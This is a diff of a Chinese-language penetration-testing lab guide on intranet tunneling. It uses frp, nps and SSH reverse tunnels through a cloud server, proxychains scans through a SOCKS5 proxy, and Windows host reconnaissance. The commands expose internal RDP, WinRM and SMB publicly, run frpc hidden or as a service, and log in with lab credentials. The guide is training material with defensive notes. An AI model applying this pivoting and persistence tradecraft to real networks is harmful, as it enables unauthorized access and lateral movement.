-Set-Content -Path "C:\inetpub\wwwroot\index.html" -Value "<html><body><h1>SRV02 内网服务器 - 192.168.100.30</h1><p>如果你能看到这个页面，说明端口映射/NAT转发成功！</p></body></html>"
-
-# 验证本地Web服务
-curl http://localhost
-# 预期：返回上面创建的HTML页面
-```
-
-**第三步：通过端口映射从Kali访问SRV02的Web服务**
+**第三步：验证Web隧道穿透**
 
 ```bash
-# 在 Kali 上通过 SRV01 的端口映射访问 SRV02 的 Web 服务
-curl http://192.168.10.20:8080
-# 预期：返回 "<h1>SRV02 内网服务器 - 192.168.100.30</h1>..."
-# 这证明：Kali → SRV01(192.168.10.20:8080) → NAT转发 → SRV02(192.168.100.30:80)
+# 通过 frp 隧道访问 SRV02 的 IIS Web 服务
+curl http://<ECS公网IP>:10002
 
-# 使用浏览器访问
-# 打开Firefox，访问 http://192.168.10.20:8080
-# 预期：显示SRV02的测试页面
+# 预期输出：
+# <html><body><h1>SRV02 内网服务器 - frp 隧道穿透成功！</h1>...
 ```
+
+在浏览器中打开 `http://<ECS公网IP>:10002`，应显示 SRV02 的测试页面。
+
+**第四步：验证RDP隧道穿透**
+
+```bash
+# 使用 xfreerdp 通过 frp 隧道连接 SRV02 的远程桌面
+xfreerdp /v:<ECS公网IP> /port:10001 /u:administrator /p:'P@ssw0rd' /cert:ignore
+```
+
+或在 Windows 宿主机上：
+1. 打开”远程桌面连接”（mstsc）
+2. 计算机：`<ECS公网IP>:10001`
+3. 输入 SRV02 的管理员账户和密码
+4. 预期：成功显示 SRV02 的远程桌面
 
 > ⚠️ **预期结果**：
-> - 直接 ping 192.168.100.30 失败（内网隔离）
-> - 通过 192.168.10.20:8080 访问成功（端口映射生效）
-> - 页面内容显示 "SRV02 内网服务器"，证明流量已转发到内网
+> - frp Dashboard 显示所有隧道正常
+> - 通过 `<ECS公网IP>:10002` 可以访问 SRV02 的 Web 服务
+> - 通过 `<ECS公网IP>:10001` 可以 RDP 连接到 SRV02
+> - **这就是内网穿透的完整效果**——SRV02 在本地内网中没有公网 IP，但通过 frp 隧道，任何人都可以通过阿里云 ECS 的公网 IP 访问 SRV02 的服务
 
-**第四步：在SRV02上观察连接来源**
-
-```powershell
-# 在 SRV02 上查看当前的网络连接
-netstat -an | findstr ":80 "
-# 预期输出示例：
-# TCP    192.168.100.30:80    192.168.100.20:xxxxx    ESTABLISHED
-# 注意：连接来源显示为 SRV01 的内网地址（192.168.100.20），而非 Kali 的地址
-```
-
-> 💡 **NAT对连接来源的隐藏效果**：SRV02 看到的连接来源是 SRV01（192.168.100.20），而不是 Kali（192.168.10.10）。这意味着 NAT 端口映射天然具有**隐藏真实来源**的效果，增加了攻击溯源的难度。这正是企业需要部署日志关联分析（而非仅依赖单点日志）的原因。
+> 💡 **安全启示**：
+> - frp 客户端只需一条**出站连接**（到 ECS:7000），即可将所有内网服务暴露出去
+> - 企业防火墙通常不阻止出站连接，这使得 frp 等工具极难从网络层面阻止
+> - 攻击者一旦在内网主机植入 frpc，即可将内网的 RDP、Web、SMB 等服务暴露到公网，为后续横向移动提供通道
+> - **防御关键**：监控内网主机的异常出站连接，部署 EDR 检测 frpc 等可疑进程
 
 ---
 
@@ -623,12 +642,11 @@ netstat -an | findstr ":80 "
 | 内网安全威胁 | 边界突破后的横向移动、内部人员恶意操作、受感染终端传播 |
 | 私有IP地址 | 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16，不路由到互联网 |
 | NAT原理 | 将私有IP转换为公网IP，通过端口号区分会话（PAT/NAPT） |
-| 端口映射 | NAT的一种应用——将外部特定端口映射到内网主机的端口 |
-| netsh portproxy | Windows自带端口映射工具：`netsh interface portproxy add v4tov4` |
-| RRAS | Windows Server路由和远程访问服务，提供图形化NAT/VPN配置 |
-| IP转发 | 注册表 `IPEnableRouter=1` 启用Windows路由功能 |
-| 内网隔离验证 | 通过ping和端口扫描验证不同网段间的可达性与隔离性 |
-| NAT的溯源影响 | NAT隐藏了真实来源IP，需要在NAT设备上关联日志才能溯源 |
+| 内网穿透概念 | 内网主机主动连接公网服务器建立隧道，外部通过隧道反向访问内网 |
+| frp架构 | frps（服务端，部署在阿里云ECS）+ frpc（客户端，运行在内网主机） |
+| frp隧道类型 | TCP（端口映射）、HTTP/HTTPS（域名代理）、SOCKS5（全网段代理） |
+| 阿里云安全组 | ECS 的虚拟防火墙，控制入站/出站流量，默认拒绝所有入站 |
+| frp防御要点 | 监控异常出站连接、部署EDR检测可疑进程、限制出站流量 |
 
 ---
 
@@ -697,7 +715,7 @@ frp 架构：
   ┌────────────┐          ┌────────────────┐         ┌────────────┐
   │   攻击机   │          │  公网服务器      │         │  内网主机   │
   │   Kali     │          │  frps 服务端     │         │  SRV02     │
-  │            │          │  (Kali上运行)    │         │  frpc 客户端│
+  │            │          │  (阿里云ECS上运行) │         │  frpc 客户端│
   │            │          │                  │         │            │
   │  访问      │    ②     │  接收请求         │   ③    │  提供服务   │
   │  :7500端口─┼─────────►│  转发给frpc      ├────────►│  RDP/SSH   │
@@ -768,208 +786,18 @@ nps 架构：
 
 ## 🛠️ 实践操作
 
-### 实验4：frp内网穿透（重点实验）
+### 实验4：frp SOCKS5代理与proxychains内网扫描（进阶）
 
-> ⚠️ **前置条件**：完成实验1（VMware网络环境搭建）和实验2（NAT转发配置），三台虚拟机之间网络连通性已验证。
+> ⚠️ **前置条件**：完成实验1-3（frp 基础隧道已建立并验证通过）。本实验演示 frp 的 SOCKS5 代理功能——通过一条隧道访问整个内网。
 >
-> **实验场景**：Kali（攻击机，模拟公网服务器）上运行 frp 服务端；SRV02（内网服务器）上运行 frp 客户端。通过 frp 隧道，Kali 可以访问 SRV02 上的 RDP、Web 等服务，而无需 NAT 端口映射。
+> **实验场景**：SRV02 的 frpc 配置中已包含 SOCKS5 隧道（端口 10080）。本实验通过 Kali（或任何攻击机）连接 SOCKS5 代理，使用 proxychains 配合 Nmap 扫描 SRV02 本地网段中的服务。
 
-**第一步：在Kali上安装frp服务端**
+**第一步：确认SOCKS5代理可用**
 
-```bash
-# 在 Kali 上执行
-
-# 方法一：从GitHub下载最新版本
-# 访问 https://github.com/fatedier/frp/releases 获取最新版本
-# 以下以 `v0.xx.x` 占位为例，请到 GitHub Releases 页面替换为当前最新稳定版本号
-
-cd /opt
-sudo wget https://github.com/fatedier/frp/releases/download/v0.xx.x/frp_0.xx.x_linux_amd64.tar.gz
-sudo tar -xzf frp_0.xx.x_linux_amd64.tar.gz
-sudo mv frp_0.xx.x_linux_amd64 frp
-cd frp
-
-# 查看文件结构
-ls -la
-# 预期文件：
-# frps         —— 服务端可执行文件
-# frps.toml    —— 服务端配置文件（v0.52+使用TOML格式）
-# frpc         —— 客户端可执行文件（拷贝到内网主机使用）
-# frpc.toml    —— 客户端配置文件
-
-# 方法二：使用包管理器安装（如果Kali仓库有最新版）
-# sudo apt update && sudo apt install frp
-```
-
-**第二步：配置frp服务端（frps.toml）**
-
-```bash
-# 在 Kali 上编辑 frps.toml
-sudo nano /opt/frp/frps.toml
-```
-
-写入以下配置内容：
+在实验2的 frpc.toml 中，已配置了 SOCKS5 隧道：
 
 ```toml
-# frps.toml - frp 服务端配置
-# frp 服务端监听端口（客户端连接端口）
-bindPort = 7000
-
-# Dashboard（Web管理面板）配置
-webServer.addr = "0.0.0.0"
-webServer.port = 7500
-webServer.user = "admin"
-webServer.password = "admin123"
-
-# 认证方式（token模式，客户端必须提供相同token才能连接）
-auth.method = "token"
-auth.token = "ClassDemo2025"
-
-# 日志配置
-log.to = "./frps.log"
-log.level = "info"
-log.maxDays = 7
-
-# 允许客户端映射的端口范围
-allowPorts = [
-  { start = 10000, end = 20000 }
-]
-```
-
-```bash
-# 启动 frp 服务端
-sudo /opt/frp/frps -c /opt/frp/frps.toml
-
-# 预期输出：
-# [I] frps tcp listen on 0.0.0.0:7000
-# [I] http service listen on 0.0.0.0:7500
-# [I] frps started successfully
-```
-
-> ⚠️ **预期结果**：frps 成功启动，监听 7000 端口（客户端连接）和 7500 端口（Web管理面板）。保持终端运行（或使用 `tmux` / `nohup` 后台运行）。
-
-```bash
-# 在新终端中验证 frps 服务端已启动
-ss -tlnp | grep -E "7000|7500"
-# 预期输出：
-# LISTEN  0  128  0.0.0.0:7000  0.0.0.0:*
-# LISTEN  0  128  0.0.0.0:7500  0.0.0.0:*
-
-# 访问 frp Dashboard（Web管理面板）
-# 在 Kali 浏览器中访问：http://127.0.0.1:7500
-# 用户名：admin  密码：admin123
-# 预期：显示 frp Dashboard 页面，可查看客户端连接状态和隧道信息
-```
-
-**第三步：将frp客户端拷贝到SRV02**
-
-frp 客户端需要运行在内网主机（SRV02）上。由于 SRV02 只有 Host-Only 网卡，需要通过 SRV01 中转文件。
-
-**方法一：通过SRV01中转（使用共享文件夹）**
-
-```powershell
-# 在 SRV01 上以管理员身份运行
-
-# 在 SRV01 上创建共享文件夹
-mkdir C:\Share
-New-SmbShare -Name "Share" -Path "C:\Share" -FullAccess "Everyone"
-```
-
-```bash
-# 在 Kali 上将 frp 客户端拷贝到 SRV01 的共享
-smbclient //192.168.10.20/Share -N -c "put /opt/frp/frpc frpc; put /opt/frp/frpc.toml frpc.toml"
-```
-
-```powershell
-# 在 SRV02 上从 SRV01 的共享拷贝 frp 客户端
-# 先在 SRV02 上创建 frp 目录
-mkdir C:\frp
-
-# 从 SRV01 拷贝文件
-Copy-Item "\\192.168.100.20\Share\frpc" "C:\frp\frpc.exe"
-Copy-Item "\\192.168.100.20\Share\frpc.toml" "C:\frp\frpc.toml"
-```
-
-**方法二：直接在SRV02上下载Windows版frp**
-
-如果 SRV02 可以通过 SRV01 的 NAT 访问互联网：
-
-```powershell
-# 在 SRV02 上执行（前提：NAT转发已配置且SRV02可访问外网）
-cd C:\
-Invoke-WebRequest -Uri "https://github.com/fatedier/frp/releases/download/v0.xx.x/frp_0.xx.x_windows_amd64.zip" -OutFile "frp.zip"
-Expand-Archive -Path "frp.zip" -DestinationPath "C:\frp" -Force
-```
-
-**方法三：使用 VMware 共享文件夹**
-
-1. 关闭 SRV02 虚拟机
-2. 虚拟机设置 → 选项 → 共享文件夹 → 添加宿主机上的 frp 文件目录
-3. 启动 SRV02，在资源管理器中访问 `\\vmware-host\Shared Folders\` 拷贝文件
-
-> 💡 **推荐方法三**（VMware 共享文件夹）：最简单直接，不需要网络连通性，不受防火墙限制。
-
-**第四步：配置frp客户端（frpc.toml）**
-
-```powershell
-# 在 SRV02 上编辑 frpc.toml
-notepad C:\frp\frpc.toml
-```
-
-写入以下配置内容：
-
-```toml
-# frpc.toml - frp 客户端配置
-
-# frp 服务端地址（Kali的IP）
-serverAddr = "192.168.10.10"
-serverPort = 7000
-
-# 认证（必须与服务端一致）
-auth.method = "token"
-auth.token = "ClassDemo2025"
-
-# 日志配置
-log.to = "./frpc.log"
-log.level = "info"
-
-# 隧道1：RDP远程桌面映射
-# Kali访问 192.168.10.10:10001 → SRV02的3389端口
-[[proxies]]
-name = "rdp"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 3389
-remotePort = 10001
-
-# 隧道2：Web服务映射
-# Kali访问 192.168.10.10:10002 → SRV02的80端口
-[[proxies]]
-name = "web"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 80
-remotePort = 10002
-
-# 隧道3：WinRM远程管理映射
-# Kali访问 192.168.10.10:10003 → SRV02的5985端口
-[[proxies]]
-name = "winrm"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 5985
-remotePort = 10003
-
-# 隧道4：SMB文件共享映射
-# Kali访问 192.168.10.10:10004 → SRV02的445端口
-[[proxies]]
-name = "smb"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 445
-remotePort = 10004
-
-# 隧道5：SOCKS5代理（通过frp隧道访问整个内网）
+# SOCKS5 代理隧道（已在实验2中配置）
 [[proxies]]
 name = "socks5"
 type = "tcp"
@@ -978,112 +806,109 @@ remotePort = 10080
 type = "socks5"
 ```
 
-> ⚠️ **注意**：上面的 SOCKS5 代理配置是 frp v0.52+ 的新语法。如果使用旧版本 frp，配置格式不同，请参考 frp 官方文档。
+验证 SOCKS5 代理端口是否开放：
 
-**第五步：启动frp客户端**
+```bash
+# 在 Kali 或本地电脑上执行
+nmap -p 10080 <ECS公网IP>
+# 预期：10080/tcp open
+```
 
-```powershell
-# 在 SRV02 上以管理员身份运行 PowerShell
+**第二步：配置proxychains**
 
-# 启动 frp 客户端
-C:\frp\frpc.exe -c C:\frp\frpc.toml
+```bash
+# 在 Kali 上编辑 proxychains 配置
+sudo nano /etc/proxychains4.conf
+
+# 在文件末尾找到 [ProxyList] 部分，替换为：
+# [ProxyList]
+# socks5 <ECS公网IP> 10080
+
+# 确保其他行保持默认（特别是 dynamic_chain 或 strict_chain）
+```
+
+**第三步：通过SOCKS5代理访问SRV02服务**
+
+```bash
+# 通过 SOCKS5 代理访问 SRV02 的 Web 服务
+proxychains curl http://127.0.0.1
+# 预期：返回 SRV02 的 IIS 测试页面
+
+# 通过 SOCKS5 代理扫描 SRV02 开放的端口
+proxychains nmap -sT -p 21,80,135,139,445,3389,5985 127.0.0.1
 
 # 预期输出：
-# [I] [service.go:302] [xxxxxxxx] login to server success
-# [I] [proxy_manager.go:144] proxy added: [rdp web winrm smb socks5]
-# [I] [service.go:109] [xxxxxxxx] [rdp] start proxy success
-# [I] [service.go:109] [xxxxxxxx] [web] start proxy success
-# ...
+# PORT     STATE  SERVICE
+# 80/tcp   open   http
+# 135/tcp  open   msrpc
+# 139/tcp  open   netbios-ssn
+# 445/tcp  open   microsoft-ds
+# 3389/tcp open   ms-wbt-server
+# 5985/tcp open   wsman
 ```
 
-> ⚠️ **预期结果**：客户端显示"login to server success"表示成功连接到 frp 服务端。所有隧道（rdp、web、winrm、smb、socks5）均显示"start proxy success"。如果连接失败，检查：（1）Kali 的 7000 端口是否可达（`Test-NetConnection 192.168.10.10 -Port 7000`）；（2）token 是否一致；（3）SRV01 的 NAT 转发是否正常。
+> 💡 **proxychains 的工作原理**：
+> - proxychains 拦截程序的网络连接请求
+> - 将请求通过 SOCKS5 代理（frp 隧道）转发
+> - frp 服务端（ECS）收到请求后，通过隧道转发给 frp 客户端（SRV02）
+> - frp 客户端的 socks5 插件在 SRV02 本地发起连接
+> - **最终效果**：Kali 上的工具"以为"自己在 SRV02 的本地网络中运行
 
-**第六步：验证frp隧道**
+**第四步：模拟多主机场景（扩展）**
+
+> 💡 **真实内网场景**：在实际渗透测试中，SRV02 通常处于一个包含多台主机的企业内网中。通过 SOCKS5 代理，攻击者可以扫描整个内网网段，发现更多目标。
+>
+> 如果学生有条件，可以在 VMware 中额外创建一台虚拟机 SRV03（192.168.100.40），与 SRV02 处于同一内网。然后通过 SOCKS5 代理从 Kali 扫描 SRV03：
 
 ```bash
-# 在 Kali 上验证所有隧道
-
-# 测试 RDP 隧道（SRV02 的远程桌面）
-nmap -p 10001 192.168.10.10
-# 预期：10001/tcp open（说明 frp 已将流量转发到 SRV02 的 3389）
-
-# 测试 Web 隧道（SRV02 的 IIS 服务）
-curl http://192.168.10.10:10002
-# 预期：返回 SRV02 的 IIS 默认页面或测试页面
-
-# 测试 WinRM 隧道
-evil-winrm -i 192.168.10.10 -P 10003 -u administrator -p 'P@ssw0rd'
-# 预期：成功连接到 SRV02 的 PowerShell 远程管理
-
-# 测试 SMB 隧道
-smbclient -L //192.168.10.10 -p 10004 -U administrator%'P@ssw0rd'
-# 预期：列出 SRV02 上的共享资源
-
-# 测试 SOCKS5 代理
-# 配置 proxychains 使用 frp 的 SOCKS5 代理
-sudo bash -c 'echo "
-[ProxyList]
-socks5 192.168.10.10 10080
-" >> /etc/proxychains4.conf'
-
-# 通过 SOCKS5 代理扫描内网
+# 如果存在内网网段 192.168.100.0/24
 proxychains nmap -sn 192.168.100.0/24
-# 预期：发现 192.168.100.20（SRV01）和 192.168.100.30（SRV02）
-# 这证明通过 frp 隧道可以访问整个内网网段！
+# 预期：发现 SRV02（192.168.100.30）和 SRV03（192.168.100.40）
+
+# 扫描 SRV03 的端口
+proxychains nmap -sT -sV -p 80,3389,445 192.168.100.30
 ```
 
-> ⚠️ **预期结果**：
-> - 所有端口映射测试通过（RDP、Web、WinRM、SMB）
-> - SOCKS5 代理可扫描到 192.168.100.0/24 内网的存活主机
-> - 这意味着攻击者通过 frp 隧道获得了对整个内网的访问能力
+> ⚠️ **proxychains 下的 nmap 限制**：
+> - 只能使用 `-sT`（TCP Connect）扫描，不能使用 `-sS`（SYN扫描，需要原始套接字）
+> - 不能使用 ICMP ping（`-sn` 可能不准确），建议使用 `-Pn` 跳过主机发现
+> - 速度较慢（每个数据包经过多层代理），扫描大网段需要耐心等待
 
-> 🛡️ **防御建议**：
-> - 监控内网主机的**出站连接**——frp 客户端需要主动连接外部服务器（7000端口），检测异常的外连行为是发现内网穿透的关键
-> - 在防火墙上**限制出站流量**——仅允许访问必要的外部服务，阻止内网主机随意连接外部IP
-> - 部署 **IDS/IPS** 检测异常的隧道流量模式（如高频小包、非标准协议等）
-> - 定期扫描内网主机上是否有 frpc/npc 等可疑进程
+**第五步：使用浏览器通过SOCKS5代理访问**
 
-**frp后台运行**：
+```text
+Firefox 设置方法：
+1. 打开 Firefox → 设置 → 常规 → 网络设置 → 设置
+2. 选择"手动代理配置"
+3. SOCKS 主机：<ECS公网IP>    端口：10080
+4. 选择 SOCKS v5
+5. 勾选"代理 DNS 时使用 SOCKS v5"
+6. 确定
 
-```powershell
-# 在 SRV02 上将 frpc 注册为 Windows 服务（开机自启动）
-# 方法一：使用 nssm（Non-Sucking Service Manager）
-# 下载 nssm：https://nssm.cc/download
-
-# 安装 frpc 为服务
-nssm install frpc "C:\frp\frpc.exe" "-c" "C:\frp\frpc.toml"
-nssm start frpc
-
-# 方法二：使用 PowerShell 后台任务
-Start-Process -FilePath "C:\frp\frpc.exe" -ArgumentList "-c C:\frp\frpc.toml" -WindowStyle Hidden
+访问 http://127.0.0.1
+预期：显示 SRV02 的 IIS 页面
 ```
 
-```bash
-# 在 Kali 上将 frps 后台运行
-# 使用 tmux
-tmux new-session -d -s frps '/opt/frp/frps -c /opt/frp/frps.toml'
-# 重新连接：tmux attach -t frps
-
-# 或使用 nohup
-nohup /opt/frp/frps -c /opt/frp/frps.toml > /dev/null 2>&1 &
-```
+> 💡 **教学意义**：SOCKS5 代理是 frp 最强大的功能之一——一条隧道即可访问目标主机所在网段的所有服务。配合 proxychains，几乎所有网络工具（nmap、hydra、curl 等）都可以通过隧道工作，就像直接在内网中一样。这正是攻击者突破单台主机后扩展战果的核心手段。
 
 ---
 
 ### 实验5：nps内网穿透（Web管理界面）
 
-> ⚠️ **前置条件**：同实验4。本实验演示 nps 的 Web 管理界面操作，适合对命令行操作不熟悉的学生。
+> ⚠️ **前置条件**：完成实验1-3。本实验演示 nps 的 Web 管理界面操作，适合作为 frp 的补充对比学习。
+>
+> **实验场景**：在阿里云 ECS 上部署 nps 服务端（提供 Web 管理界面），在 SRV02（本地虚拟机）上运行 nps 客户端。通过 Web 界面可视化管理隧道配置。
 
-**第一步：在Kali上安装nps服务端**
+**第一步：在ECS上安装nps服务端**
 
 ```bash
-# 在 Kali 上执行
+# 在阿里云 ECS 上执行
 
 # 从 GitHub 下载 nps 最新版本
 # 访问 https://github.com/ehang-io/nps/releases 获取最新版本
 
 cd /opt
-sudo wget https://github.com/ehang-io/nps/releases/download/v0.xx.x/linux_amd64_server.tar.gz
+sudo wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
 sudo mkdir nps && sudo tar -xzf linux_amd64_server.tar.gz -C nps
 cd nps
 
@@ -1123,6 +948,8 @@ bridge_type=tcp
 # private_key=keys/private_key.pem
 ```
 
+> ⚠️ **安全组提醒**：确保阿里云安全组已放行 8080（Web管理）和 8024（客户端连接）端口。
+
 **第三步：启动nps服务端**
 
 ```bash
@@ -1144,7 +971,7 @@ ss -tlnp | grep -E "8080|8024"
 
 **第四步：通过Web界面添加客户端**
 
-1. 在 Kali 浏览器中访问：`http://127.0.0.1:8080`
+1. 在本地浏览器中访问：`http://<ECS公网IP>:8080`
 2. 输入用户名 `admin`，密码 `admin123` 登录
 3. 左侧菜单选择 **客户端** → 点击 **新增**
 4. 填写客户端信息：
@@ -1176,33 +1003,31 @@ ss -tlnp | grep -E "8080|8024"
 ```powershell
 # 在 SRV02 上执行
 
-# 方法一：从 GitHub 下载 Windows 版客户端
-Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.xx.x/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
+# 从 GitHub 下载 Windows 版客户端
+Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.26.10/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
 # 使用 7-Zip 解压（tar.gz 格式）
-
-# 方法二：使用 VMware 共享文件夹拷贝
 ```
 
 ```powershell
 # 在 SRV02 上启动 npc
-C:\npc\npc.exe -server=192.168.10.10:8024 -vkey=npstest2025
+C:\npc\npc.exe -server=<ECS公网IP>:8024 -vkey=npstest2025
 
 # 预期输出：
 # npc start successfully
 ```
 
-> ⚠️ **预期结果**：nps 客户端成功连接到服务端。在 Kali 的 nps Web 管理界面中刷新客户端列表，SRV02-Internal 的状态应变为"在线"。
+> ⚠️ **预期结果**：nps 客户端成功连接到服务端。在浏览器的 nps Web 管理界面中刷新客户端列表，SRV02-Internal 的状态应变为"在线"。
 
 **第七步：验证nps隧道**
 
 ```bash
-# 在 Kali 上测试
+# 在本地电脑或 Kali 上测试
 # 测试 RDP 隧道
-nmap -p 10001 192.168.10.10
+nmap -p 10001 <ECS公网IP>
 # 预期：10001/tcp open
 
 # 测试 Web 隧道
-curl http://192.168.10.10:10002
+curl http://<ECS公网IP>:10002
 # 预期：返回 SRV02 的 Web 页面
 ```
 
@@ -1216,98 +1041,100 @@ curl http://192.168.10.10:10002
 ### 实验6：SSH隧道内网穿透
 
 > SSH 隧道是最简单的内网穿透方式，无需安装额外工具，只需 SSH 客户端和服务端即可。
+>
+> **实验场景**：在阿里云 ECS 上启用 SSH 服务（Ubuntu 默认已启用），从 Kali 或本地电脑通过 SSH 隧道将 SRV02 的内网服务转发到本地。
 
 **原理**：
 
 ```
 SSH隧道类型：
 
-1. 本地端口转发（-L）：
-   Kali:LOCAL_PORT ──SSH──► SRV01:22 ──→ SRV02:TARGET_PORT
-   将远程内网端口映射到本地
+1. 远程端口转发（-R）—— 最适合内网穿透场景：
+   ECS:REMOTE_PORT ◄──SSH── SRV02:22 ──← SRV02 主动连接 ECS
+   SRV02 将自己的端口暴露到 ECS 的公网 IP 上
 
-2. 远程端口转发（-R）：
-   SRV01:REMOTE_PORT ◄──SSH── Kali:22 ──← SRV02 无法主动连接时使用
-   将本地端口暴露到远程
+2. 本地端口转发（-L）：
+   Kali:LOCAL_PORT ──SSH──► ECS:22 ──→ ECS 可达的其他服务
+   将远程端口映射到本地
 
 3. 动态端口转发（-D）：
-   Kali:LOCAL_PORT ──SSH──► SRV01:22 ──→ 整个内网
-   创建SOCKS5代理，访问整个内网
+   Kali:LOCAL_PORT ──SSH──► ECS:22 ──→ 整个网络
+   创建SOCKS5代理
 ```
 
-**第一步：在SRV01上启用OpenSSH Server**
-
-```powershell
-# 在 SRV01 上以管理员身份运行
-
-# 安装 OpenSSH Server
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-
-# 启动 SSH 服务
-Start-Service sshd
-Set-Service -Name sshd -StartupType Automatic
-
-# 验证 SSH 服务已启动
-Get-Service sshd
-# 预期：Status = Running
-```
-
-**第二步：本地端口转发（从Kali访问SRV02的RDP）**
+**第一步：确认ECS上SSH服务已启用**
 
 ```bash
-# 在 Kali 上执行
-# 通过 SRV01 转发，将 SRV02 的 RDP(3389) 映射到本地 13389 端口
+# 在 ECS 上执行（Ubuntu 默认已安装并启用 SSH）
+sudo systemctl status sshd
+# 预期：active (running)
 
-ssh -L 13389:192.168.100.30:3389 administrator@192.168.10.20 -N -f
+# 如果未启用，安装并启动：
+sudo apt install -y openssh-server
+sudo systemctl enable --now sshd
+```
+
+> 💡 **阿里云 ECS 的 SSH 服务**：Ubuntu 镜像默认已安装 OpenSSH Server，且安全组在实验1中已放行 22 端口，无需额外配置。
+
+**第二步：远程端口转发（SRV02 将 RDP 暴露到 ECS）**
+
+远程端口转发是内网穿透的经典场景——内网主机（SRV02）主动 SSH 连接到公网服务器（ECS），将自己的端口暴露出去。
+
+```powershell
+# 在 SRV02（本地虚拟机）上执行
+# SRV02 通过 SSH 连接到 ECS，将本地 RDP(3389) 暴露到 ECS 的 13389 端口
+
+ssh -R 13389:127.0.0.1:3389 root@<ECS公网IP> -N -f
 
 # 参数说明：
-# -L 13389:192.168.100.30:3389   本地端口转发：本地13389 → SRV02:3389
+# -R 13389:127.0.0.1:3389   远程端口转发：ECS:13389 → SRV02:3389
 # -N  不执行远程命令（仅转发）
 # -f  后台运行
 
-# 验证隧道
-nmap -p 13389 127.0.0.1
+# 验证隧道是否建立成功
+# 在 SRV02 上应看到 SSH 连接已建立
+netstat -an | findstr ":22"
+```
+
+```bash
+# 在 Kali 或本地电脑上验证
+# 通过 ECS 的 13389 端口连接 SRV02 的 RDP
+nmap -p 13389 <ECS公网IP>
 # 预期：13389/tcp open
 
-# 通过隧道连接 SRV02 的 RDP
-rdesktop 127.0.0.1:13389
-# 或使用 xfreerdp
-xfreerdp /v:127.0.0.1:13389 /u:administrator /p:'P@ssw0rd'
+xfreerdp /v:<ECS公网IP> /port:13389 /u:administrator /p:'P@ssw0rd' /cert:ignore
+# 预期：成功连接到 SRV02 的远程桌面
 ```
+
+> ⚠️ **安全组提醒**：确保 ECS 安全组已放行 13389 端口的入站 TCP 流量。
 
 **第三步：动态端口转发（SOCKS5代理）**
 
 ```bash
-# 在 Kali 上执行
-# 通过 SRV01 创建 SOCKS5 代理，访问整个内网
+# 在 Kali 或本地电脑上执行
+# 通过 ECS 创建 SOCKS5 代理
 
-ssh -D 1080 administrator@192.168.10.20 -N -f
+ssh -D 1080 root@<ECS公网IP> -N -f
 
 # 参数说明：
 # -D 1080   在本地1080端口创建SOCKS5代理
 
-# 使用 proxychains 通过 SOCKS5 代理扫描内网
+# 使用 proxychains 通过 SOCKS5 代理访问服务
 # 确保 /etc/proxychains4.conf 中配置了：
 # [ProxyList]
 # socks5 127.0.0.1 1080
 
-proxychains nmap -sn 192.168.100.0/24
-# 预期：发现 192.168.100.20 和 192.168.100.30
-
-proxychains nmap -sV -p 80,3389,445,5985 192.168.100.30
-# 预期：扫描 SRV02 的开放端口
-
-# 使用浏览器通过 SOCKS5 代理访问 SRV02 的 Web 服务
-# Firefox 设置 → 网络设置 → 手动代理配置
-# SOCKS主机：127.0.0.1  端口：1080  SOCKS v5
-# 访问 http://192.168.100.30
-# 预期：显示 SRV02 的 IIS 页面
+# 如果 SRV02 已通过 frp 或 SSH 隧道暴露了端口，可通过代理访问
+proxychains curl http://127.0.0.1:10002
+# 预期：返回 SRV02 的 Web 页面
 ```
 
 > 💡 **SSH 隧道 vs frp 对比**：
-> - SSH 隧道不需要额外安装工具，但需要目标主机开放 SSH 服务
-> - frp 适用范围更广，可穿透没有 SSH 服务的网络
+> - SSH 隧道不需要额外安装工具，但需要 ECS 开放 SSH 服务
+> - frp 适用范围更广，支持更多协议和功能（Dashboard、健康检查等）
+> - SSH 远程端口转发（-R）等效于 frp 的 TCP 隧道功能
 > - SSH 动态端口转发（-D）等效于 frp 的 SOCKS5 代理功能
+> - **frp 更适合持久化的内网穿透**（可注册为服务、支持断线重连），SSH 隧道更适合临时使用
 
 ---
 
@@ -1398,7 +1225,7 @@ proxychains nmap -sV -p 80,3389,445,5985 192.168.100.30
 
 ### 实验7：Windows内网信息收集（在SRV02上执行）
 
-> ⚠️ **前置条件**：完成实验1-2，SRV02 可通过 SRV01 访问外网。本实验在 SRV02 上执行，模拟攻击者获取内网主机权限后的信息收集。
+> ⚠️ **前置条件**：完成实验1-3，frp 隧道已建立。本实验在 SRV02 上执行，模拟攻击者获取内网主机权限后的信息收集。
 >
 > **操作方式**：本实验同时提供**图形界面**和**命令行**两种操作方式。
 
@@ -1410,22 +1237,22 @@ proxychains nmap -sV -p 80,3389,445,5985 192.168.100.30
 # 1. 查看完整网络配置
 ipconfig /all
 # 关键信息：
-# - IPv4 地址：192.168.100.30
-# - 默认网关：192.168.100.20（SRV01，可作为攻击跳板）
-# - DNS 服务器：192.168.100.20
+# - IPv4 地址：取决于VMware网络配置
+# - 默认网关：取决于VMware NAT网关地址
+# - DNS 服务器：取决于网络配置
 
 # 2. 查看路由表
 route print
-# 关键信息：发现网关 192.168.100.20 负责转发非本地流量
-# 攻击者可推断：192.168.100.0/24 是本地网段，网关可访问其他网段
+# 关键信息：发现网关负责转发非本地流量
+# 攻击者可推断：本地网段范围，是否存在多网段
 
 # 3. 查看 ARP 缓存（发现同网段主机）
 arp -a
 # 预期输出：
-# Interface: 192.168.100.30
+# Interface: <SRV02的IP地址>
 #   Internet Address    Physical Address    Type
-#   192.168.100.20      xx-xx-xx-xx-xx-xx   dynamic  ← SRV01
-#   192.168.100.255     ff-ff-ff-ff-ff-ff   static
+#   <网关IP>            xx-xx-xx-xx-xx-xx   dynamic  ← 网关/其他主机
+#   <广播地址>          ff-ff-ff-ff-ff-ff   static
 
 # 4. 查看活跃网络连接
 netstat -an | findstr "ESTABLISHED"
@@ -1488,7 +1315,7 @@ echo %USERDOMAIN%
 
 # 1. 查看网络上的计算机（NetBIOS广播）
 net view
-# 预期：列出同网段可发现的计算机（如 SRV01）
+# 预期：列出同网段可发现的计算机（如网关、其他主机）
 
 # 2. 查看域信息（如果加入了域）
